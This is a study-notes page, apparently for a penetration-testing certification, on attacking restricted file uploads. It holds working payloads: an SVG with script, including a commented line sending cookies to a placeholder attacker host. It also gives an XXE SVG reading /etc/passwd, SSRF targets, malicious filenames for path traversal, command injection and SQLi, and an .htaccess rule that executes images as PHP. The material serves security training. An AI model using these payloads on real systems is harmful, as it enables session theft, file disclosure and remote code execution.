---
title: 'Limited & Other File Upload Attacks'
description: 'When you cannot get RCE, a restricted upload is still dangerous — stored XSS, XXE and SSRF via SVG, denial of service, and injection through the filename itself.'
tags:
  - CPTS
  - Web
  - File Upload
  - XSS
  - XXE
icon: material/file-cancel
---

# Limited & Other File Upload Attacks

!!! abstract "No RCE? Still dangerous."
    Sometimes the server genuinely only allows real images, or your file is stored but never executed. That doesn't mean the feature is safe. A *limited* file upload can still deliver **stored XSS, XXE, SSRF, DoS**, and injection through the **filename** itself. These are common findings even on hardened upload forms.

## Stored XSS via SVG / HTML

If the app lets you upload **SVG** (a whitelisted "image" that is actually XML) or **HTML**, you can embed JavaScript that runs when another user views the file.

```xml title="xss.svg"
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <script type="text/javascript">
    alert(document.domain);
    // or exfiltrate cookies: new Image().src='//attacker/?c='+document.cookie;
  </script>
</svg>
```

Upload it as your avatar; when the SVG is rendered inline (not as a download), the script executes in the victim's session.

!!! tip "Image metadata XSS"
    Even a normal JPEG/PNG can carry an XSS payload in its **metadata** if the app reflects that metadata unsanitised:
    ```shell
    exiftool -Comment='"><img src=x onerror=alert(document.domain)>' image.jpg
    ```

## XXE via SVG

SVG is XML, so an upload that's later **parsed** can be hit with XML External Entity injection — read local files or trigger SSRF:

```xml title="xxe.svg"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

If the rendered SVG echoes the text node, the contents of `/etc/passwd` come back in the image. Swap the entity for `php://filter/convert.base64-encode/resource=index.php` to read source, or an internal URL for SSRF.

!!! note "DOCX, XLSX, PPTX are XML too"
    Office documents are zipped XML. An upload that processes them server-side (thumbnailing, text extraction) can be XXE-vulnerable the same way as SVG.

## SSRF & Second-Order Attacks

If the upload accepts a **URL** ("upload from link") or processes the file with a back-end library, you may reach internal services:

- Point an "upload from URL" field at `http://169.254.169.254/latest/meta-data/` (cloud metadata) or `http://localhost:6379` (internal Redis).
- Upload a file format handled by a vulnerable library (ImageMagick "ImageTragick", Ghostscript) to escalate a "safe" image upload into RCE or SSRF.

## Denial of Service

A restricted upload can still take the service down:

| Attack | Payload |
|--------|---------|
| **Decompression bomb** | A tiny zip/image that expands to gigabytes (e.g. `42.zip`, pixel-flood PNG). |
| **Pixel flood** | An image with enormous declared dimensions that exhausts memory on resize. |
| **Disk exhaustion** | Many large uploads with no quota — fill the volume. |
| **Path-based overwrite** | Overwrite another user's file or app config (see filename attacks below). |

## Filename Injection Attacks

The **filename** is attacker-controlled text that often flows into shell commands, SQL, the page, or the filesystem path — each a separate injection surface:

| Sink | Malicious filename | Result |
|------|-------------------|--------|
| Filesystem path | `../../../var/www/html/shell.php` | **Path traversal** — write outside the upload dir / overwrite files. |
| OS command | `; sleep 5; .jpg` or `$(id).jpg` | **Command injection** if the name is passed to a shell. |
| SQL query | `file';-- -.jpg` | **SQLi** if the name is stored via string-concatenated SQL. |
| HTML page | `<script>alert(1)</script>.jpg` | **Stored XSS** when the filename is displayed unescaped. |
| XSS via overwrite | predictable names | overwrite a JS/CSS asset to poison other pages. |

!!! warning "Path traversal is the classic"
    Always test `../` sequences (and URL-encoded `%2e%2e%2f`) in the `filename`. Writing your shell to the web root — or clobbering `.htaccess`/config — is frequently the difference between "stored image" and "full compromise."

### Bonus: `.htaccess` Upload

If you can upload an Apache `.htaccess` (or `web.config` on IIS), you can *redefine which extensions execute as code*, then upload a shell with an allowed extension:

```apache title=".htaccess"
AddType application/x-httpd-php .jpg
```

Now your innocuous `shell.jpg` is executed as PHP — turning a whitelist win into RCE.

## Key Takeaways

!!! success "Revision recap"
    - **SVG/HTML upload → stored XSS**; SVG is XML so it also enables **XXE** (file read / SSRF).
    - Image **metadata** (EXIF) can carry XSS or PHP payloads — sanitise on display, strip on upload.
    - "Upload from URL" and vulnerable parsers (ImageMagick/Ghostscript) → **SSRF / RCE**.
    - **DoS** via decompression bombs, pixel floods, or disk exhaustion.
    - The **filename** is an injection vector: path traversal, command injection, SQLi, XSS.
    - `.htaccess`/`web.config` uploads can re-map extensions and grant RCE.

➡️ Next: [Prevention & Hardening](prevention.md) — how to shut all of this down.
